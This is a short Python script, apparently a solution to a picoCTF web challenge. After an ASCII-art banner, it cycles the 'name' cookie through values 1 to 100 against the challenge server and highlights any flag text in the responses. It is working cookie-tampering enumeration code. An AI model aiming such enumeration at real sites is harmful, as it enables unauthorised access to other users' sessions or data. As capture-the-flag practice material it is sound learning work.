import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style
import time

# ASCII art
ascii_art = f"""{Fore.GREEN}
   _____                 _    _        _____ _                                 
  / ____|               | |  (_)      / ____| |                                
 | |     ___   ___   ___| | ___  ___ | |    | |__   __ _ _ __   __ _  ___ _ __ 
 | |    / _ \\ / _ \\ / __| |/ / |/ _ \\| |    | '_ \\ / _` | '_ \\ / _` |/ _ \\ '__|
 | |___| (_) | (_) | (__|   <| |  __/| |____| | | | (_| | | | | (_| |  __/ |   
  \\_____\\___/ \\___/ \\___|_|\\_\\_|\\___| \\_____|_| |_|\\__,_|_| |_|\\__, |\\___|_|   
                                                               __/ |          
                                                              |___/
                                                              
                                                              
 Program starting...{Style.RESET_ALL}
"""


print(ascii_art)
time.sleep(1)

target_url = "http://mercury.picoctf.net:27177/"
max_redirects = 10
max_cookies = 100

# Create a session to control redirects
session = requests.Session()
session.max_redirects = max_redirects

highlight_words = ["flag", "Flag", "pico", "CTF"]

def highlight_text(text):
    for word in highlight_words:
        if word in text:
            text = text.replace(word, f"{Fore.RED}{word}{Style.RESET_ALL}")
    return text

for i in range(1, max_cookies + 1):
    # Modify the "name" cookie value to the current number (i)
    cookies = {"name": str(i)}

    try:
        # Send the request with the updated cookie using the session object
        response = session.get(target_url, cookies=cookies, allow_redirects=True)

        # Process the response and print the content
        print(f"Response for name={i}: {response.status_code}")
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            jumbotron_content = soup.find('div', {'class': 'jumbotron'})
            if jumbotron_content:
                highlighted_text = highlight_text(jumbotron_content.text.strip())
                print(highlighted_text, "\n")
            else:
                print("Jumbotron content not found.")
        else:
            print(f"Error: {response.status_code}")

    except requests.exceptions.TooManyRedirects:
        print("Exceeded maximum number of redirects. Exiting...")
        break
